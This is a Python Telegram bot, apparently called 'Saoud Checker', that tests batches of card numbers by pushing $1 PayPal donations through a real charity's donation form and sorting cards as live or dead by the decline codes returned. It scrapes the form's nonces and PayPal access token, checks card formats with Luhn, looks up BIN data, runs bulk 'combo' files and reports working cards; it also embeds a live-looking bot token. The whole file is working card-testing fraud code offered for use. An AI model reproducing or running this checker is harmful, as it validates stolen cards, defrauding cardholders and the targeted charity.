import telebot
import time
import threading
from telebot import types
import requests, random, os, pickle, time, re
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import base64
from datetime import datetime

# توكن البوت
token = '1921203535:AAFedV8fg6D_3-OdbBiM454Vx9Z-kWizPYk'
bot = telebot.TeleBot(token, parse_mode="HTML")

#ايدي حسابك
admin = 1013384909
myid = ['1013384909']
stop = {}
user_gateways = {}
stop_flags = {} 
stopuser = {}
command_usage = {}

mes = types.InlineKeyboardMarkup()
mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))


# ==========================================
# PayPal Class (الجديد)
# ==========================================
class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        url = 'https://riversidefoxfoundation.org/donations/an-evening-at-the-fox/'
        parsed = urlparse(url)
        domain = parsed.netloc
        path = parsed.path
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.url = domain
        self.inurl = path
        self.email = f"{random.choice(self.first_name)}{random.choice(self.last_name)}{random.randint(100,999)}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()

    def Key(self):
        he1 = {
            'upgrade-insecure-requests': '1',
            'user-agent': self.uu.random,
        }
        r1 = self.r.get(f'https://{self.url}{self.inurl}', headers=he1)
        self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
        self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
        self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', r1.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Krs(self, ccx):
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        he2 = {
            'user-agent': self.uu.random,
            'x-requested-with': 'XMLHttpRequest',
        }

        da1 = {
            'give-honeypot': '',
            'give-form-id-prefix': self.id_form1,
            'give-form-id': self.id_form2,
            'give-form-title': 'Make a One-off Donation',
            'give-current-url': f'https://{self.url}{self.inurl}',
            'give-form-url': f'https://{self.url}{self.inurl}',
            'give-form-minimum': self.donation,
            'give-form-maximum': '50000',
            'give-form-hash': self.nonec,
            'give-price-id': 'custom',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': self.donation,
            'give_recurring_donation_details': '{"is_recurring":false}',
            'give-amount': self.donation,
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'card_name': 'msms',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_gift_check_is_billing_address': 'no',
            'give_gift_aid_address_option': 'billing_address',
            'give_gift_aid_card_first_name': '',
            'give_gift_aid_card_last_name': '',
            'give_gift_aid_billing_country': 'GB',
            'give_gift_aid_card_address': '',
            'give_gift_aid_card_address_2': '',
            'give_gift_aid_card_city': '',
            'give_gift_aid_card_state': '',
            'give_gift_aid_card_zip': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }

        r2 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=he2, data=da1)

        da2 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-title': (None, 'Make a One-off Donation'),
            'give-current-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '50000'),
            'give-form-hash': (None, self.nonec),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, '1'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'card_name': (None, 'ali'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_gift_check_is_billing_address': (None, 'no'),
            'give_gift_aid_address_option': (None, 'billing_address'),
            'give_gift_aid_card_first_name': (None, ''),
            'give_gift_aid_card_last_name': (None, ''),
            'give_gift_aid_billing_country': (None, 'GB'),
            'give_gift_aid_card_address': (None, ''),
            'give_gift_aid_card_address_2': (None, ''),
            'give_gift_aid_card_city': (None, ''),
            'give_gift_aid_card_state': (None, ''),
            'give_gift_aid_card_zip': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })

        he3 = {
            'accept': '*/*',
            'content-type': da2.content_type,
            'user-agent': self.uu.random,
        }

        pa1 = {
            'action': 'give_paypal_commerce_create_order',
        }

        r3 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {self.au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }

        da3 = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }

        r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{r3}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-title': (None, 'Make a One-off Donation'),
            'give-current-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '50000'),
            'give-form-hash': (None, self.nonec),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, self.donation),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, self.donation),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'card_name': (None, 'ali'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_gift_check_is_billing_address': (None, 'no'),
            'give_gift_aid_address_option': (None, 'billing_address'),
            'give_gift_aid_card_first_name': (None, ''),
            'give_gift_aid_card_last_name': (None, ''),
            'give_gift_aid_billing_country': (None, 'GB'),
            'give_gift_aid_card_address': (None, ''),
            'give_gift_aid_card_address_2': (None, ''),
            'give_gift_aid_card_city': (None, ''),
            'give_gift_aid_card_state': (None, ''),
            'give_gift_aid_card_zip': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })

        he5 = {
            'accept': '*/*',
            'content-type': da4.content_type,
            'user-agent': self.uu.random,
        }

        pa2 = {
            'action': 'give_paypal_commerce_approve_order',
            'order': r3,
        }

        r5 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)

        text = r5.text
        if 'true' in text or 'sucsess' in text:
            return 'CHARGE 1.00$'
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return "INVALID_ACCOUNT"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return "PICKUP_CARD_SPECIAL_CONDITIONS"
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "INSUFFICIENT_FUNDS"
        elif 'GENERIC_DECLINE' in text:
            return "GENERIC_DECLINE"
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return "PAYMENT_DENIED"
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return "SECURITY_VIOLATION"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_OR_RESTRICTED_CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY_LATER"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "TX_ATTEMPTS_EXCEED_LIMIT"
        else:
            try:
                result = r5.json()['data']['error']
                return result
            except:
                return "UNKNOWN_ERROR"

# ==========================================
# Helper Functions
# ==========================================
def luhn_check(number: str) -> bool:
    """Luhn algorithm to validate card number."""
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def reg(cc: str):
    parts = [p for p in re.split(r'\D+', cc) if p != '']
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        if len(yy) == 4 and (yy.startswith('20') or yy.startswith('19')):
            pass
        elif len(yy) == 1:
            return None
        is_amex = pan.startswith('34') or pan.startswith('37')
        expected_pan_len = 15 if is_amex else 16
        expected_cvc_len = 4 if is_amex else 3

        if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
            return None
        if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
            return None
        if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
            return None
        if not re.fullmatch(r'\d{%d}' % expected_cvc_len, cvc):
            return None
        if not luhn_check(pan):
            return None
        return f"{pan}|{mm}|{yy}|{cvc}"

    digits = ''.join(re.findall(r'\d', cc))
    if not digits:
        return None
    is_amex = digits.startswith('34') or digits.startswith('37')
    cvc_len = 4 if is_amex else 3
    min_len = (15 if is_amex else 16) + 2 + 2 + cvc_len
    if len(digits) < min_len:
        return None
    cvc = digits[-cvc_len:]
    rest = digits[:-cvc_len]
    yy_candidate = rest[-2:]
    mm_candidate = rest[-4:-2]
    pan_candidate = rest[:-4]
    if len(rest) >= 6 and rest[-4:-2] in ('20', '19'):
        yy = rest[-4:]
        mm = rest[-6:-4]
        pan = rest[:-6]
    else:
        yy = yy_candidate
        mm = mm_candidate
        pan = pan_candidate
    mm = mm.zfill(2)
    expected_pan_len = 15 if (pan.startswith('34') or pan.startswith('37')) else 16
    if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
        return None
    if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
        return None
    if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
        return None
    if not re.fullmatch(r'\d{%d}' % cvc_len, cvc):
        return None
    if not luhn_check(pan):
        return None
    return f"{pan}|{mm}|{yy}|{cvc}"

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/"+zh).json()
        brand=api_url["brand"]
        card_type=api_url["type"]
        level=api_url["level"]
        bank=api_url["bank"]
        country_name=api_url["country_name"]
        country_flag=api_url["country_flag"]
        mn = f'''[<a href="https://t.me/l">ϟ</a>] 𝐁𝐢𝐧: <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐁𝐚𝐧𝐤: <code>{bank} - {country_flag}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country_name} [ {country_flag} ]</code>'''
        return mn
    except Exception as e:
        print(e)
        return 'No info'

# ==========================================
# Telegram Bot Handlers
# ==========================================
@bot.message_handler(commands=["start"])
def handle_start(message):
    sent_message = bot.send_message(chat_id=message.chat.id, text="💥 Starting...")
    time.sleep(1)
    name = message.from_user.first_name
    bot.edit_message_text(chat_id=message.chat.id,
                          message_id=sent_message.message_id,
                          text=f"Hi {name}, Welcome To Saoud Checker (Stripe Auth)",
                          reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    name = call.from_user.first_name
    bot.send_message(call.message.chat.id, 
        '''- مرحباً بك في بوت فحص بايبال كوستم 😡


للفحص اليدوي للاوث [/pp] و للكومبو فقط ارسل الملف.


اختر نوع الفحص وسيبدأ البوت بأعطائك افضل النتائج مع علاوي الاسطوره @B11HB''')
    bot.edit_message_text(chat_id=call.message.chat.id,
                          message_id=call.message.message_id,
                          text=f"Hi {name}, Welcome To Saoud Checker (Paypal)",
                          reply_markup=mes)

@bot.message_handler(func=lambda message: message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp'))
def my_ali4(message):
    name = message.from_user.first_name
    idt=message.from_user.id
    id=message.chat.id
    try:command_usage[idt]['last_time']
    except:command_usage[idt] = {
                'last_time': datetime.now()
            }
    if command_usage[idt]['last_time'] is not None:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>",parse_mode="HTML")
            return	
    ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
    try:
        cc = message.reply_to_message.text
    except:
        cc=message.text
    cc=str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
        return
    start_time = time.time()
    try:
        command_usage[idt]['last_time'] = datetime.now()
        # استخدام الكلاس الجديد
        rr = PayPal()
        itt = rr.Key()
        pali_func = rr.Krs
        last = str(pali_func(cc))
    except Exception as e:
        last=f'Error {e}'
        
    end_time = time.time()
    execution_time = end_time - start_time
    msg=f'''<strong>#PayPal_Custom 1.00$ 🔥 [/pp]
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{'CHARGE 1.00$🔥' if 'CHARGE 1.00$' in last else 'Approved PayPal' if 'INSUFFICIENT_FUNDS' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=8169349350'>Ali Check</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

@bot.message_handler(content_types=('document'))
def GTA(message):
    user_id = str(message.from_user.id)
    name = message.from_user.first_name or message.from_user.username or "User"
    bts=types.InlineKeyboardMarkup()
    soso=types.InlineKeyboardButton(text='PayPal Custom 5.00$', callback_data='ottpa2')
    bts.add(soso)
    bot.reply_to(message,'Select the type of examination', reply_markup=bts)
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"com{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error downloading file: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
    def my_ali():
        user_id = str(call.from_user.id)
        passs = 0
        basl = 0
        tote = 0
        filename = f"com{user_id}.txt"
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..")
        with open(filename, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            stopuser.setdefault(user_id, {})['status'] = 'start'
            # إنشاء كائن PayPal مرة واحدة
            rr = PayPal()
            itt = rr.Key()
            pali_func = rr.Krs
            
            for cc in lino:
                if stopuser.get(user_id, {}).get('status') == 'stop':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f'''The Has Stopped Checker PayPal Custom 1.00$. 🤓
                        
Approved! : {passs}
Declined! : {basl}
Total! : {passs + basl} / {total}
Dev! : @B11HB''')
                    return

                try:
                    start_time = time.time()
                    last = str(pali_func(cc))
                except Exception as e:
                    print(e)
                    last = "ERROR"
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"- Status! : {last} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"- Approved! ✅ : [ {passs} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"- Declined! ❌ : [ {basl} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"- Total! : [ {total} ] •", callback_data='x')
                stop=types.InlineKeyboardButton("[ Stop Checher! ]", callback_data='stop')
                mes.add(cm1, status, cm3,cm4, cm5 ,stop)
                end_time = time.time()
                execution_time = end_time - start_time
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''- Checker To PayPal Custom 1.00$ ☑️
- Time: {execution_time:.2f}s''',
                    reply_markup=mes
                )
                n = cc.split("|")[0]
                mm = cc.split("|")[1]
                yy = cc.split("|")[2]
                cvc = cc.split("|")[3].strip()
                cc = n+'|'+mm+'|'+yy+'|'+cvc
                msg=  f'''<strong>#PayPal_Custom 1.00$ 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{'CHARGE 1.00$🔥' if 'CHARGE 1.00$' in last else 'Approved PayPal' if 'INSUFFICIENT_FUNDS' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=8169349350'>Ali Check</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''

                if 'CHARGE 1.00$' in last or 'INSUFFICIENT_FUNDS' in last:
                    passs += 1
                    bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                else:
                    basl +=1
                time.sleep(14)

        bot.edit_message_text(
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id,
            text=f'''The Inspection Was Completed By PayPal Custom 1.00$ Pro. 🥳
    
Approved!: {passs}
Declined!: {basl}
Total!: {passs + basl}
Dev!: @B11HB''')
                    
    my_thread = threading.Thread(target=my_ali)
    my_thread.start()				

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass

print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(5)
